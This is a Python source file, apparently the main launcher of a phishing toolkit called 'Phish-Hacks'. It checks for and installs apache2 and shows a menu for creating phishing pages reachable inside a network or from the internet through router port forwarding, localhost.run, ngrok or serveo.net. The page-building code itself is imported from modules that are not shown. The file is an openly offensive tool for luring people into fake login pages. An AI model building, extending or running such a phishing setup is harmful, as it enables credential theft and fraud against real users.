import os
import sys
import subprocess
import time
sys.path.insert(1, f'{os.getcwd()}/src')
from phish_setup import PhishSetup # type: ignore
from phish_create import PhishCreate
from colorama import init, Fore
init()
GREEN = Fore.GREEN
RED   = Fore.RED
BLUE   = Fore.BLUE
RESET = Fore.RESET

os.system("clear")
error_raise = 0
def banner():
    print(f"{RED}         Welcome to Phish-Hacks         {RESET}")
    print(f"""{RED}
     ______ _   _     _    _            _        
    |  ____| | | |   | |  | |          | |       
    | |__  | |_| |__ | |__| | __ _  ___| | _____ {RESET}{BLUE}
    |  __| | __| '_ \|  __  |/ _` |/ __| |/ / __|
    | |____| |_| | | | |  | | (_| | (__|   <\___ {RESET}{GREEN}
    |______|\__|_| |_|_|  |_|\__,_|\___|_|\_\___|
        {RESET}""")
    print("\n")
    print("----------------------------------------------------------------------------")

banner()
result = subprocess.run("apaches2 -help", shell=True, capture_output=True, text=True)
if "not found" in result.stderr and "apache2" in result.stderr:
    print("[-] Apache2 is not installed. Installing apache2: -----")
    result = subprocess.run("apt install apache2 -y", shell=True, capture_output=True, text=True)
    result = subprocess.run("apache2 -help", shell=True, capture_output=True, text=True)
    if "not found" in result.stderr and "apache2" in result.stderr:
        print("[-] Could not install apache2: Install it manaully -----")
        error_raise += 1
    else:
        print("[+] Apache2 is successfully installed!!!!")
else:
    print("[+] Apache2 is already installed!!!!")

time.sleep(2)
if error_raise == 0:
    ON = True
    
    while ON:
        os.system("clear")
        banner()
        print(f"{GREEN}0. Create Phishing Page for within the network.")
        print("1. Create Phishing Page for outside the network using ROUTER PORT FORWARDING.")
        print("2. Create Phishing Page for outside th network using localhost.run (SSH TUNNELING).")
        print("3. Create Phishing Page for outside th network using ngrok")
        print("4. Create Phishing Page for outside th network using serveo.net")
        print("5. Exit.")
        option = input(f"[?] Select the option by typing corresponding index number -->{RESET}")
        if option == "5" or option == "exit" or option == "Exit" or option == "EXIT":
            ON = False
        elif option == "0":
            os.system("clear")
            PhishSetup().setup_within_network()
        elif option == "1":
            os.system("clear")
            PhishSetup().setup_with_port_forwarding()
        elif option == "2":
            os.system("clear")
            PhishSetup().setup_with_localhost_run()
        elif option == "3":
            os.system("clear")
            PhishSetup().setup_with_ngrok()
        elif option == "4":
            os.system("clear")
            PhishSetup().setup_with_serveo()

        

else:
    print("\n\n[--] Apache2 could not be installed. Install it manually and then run this program.")
        
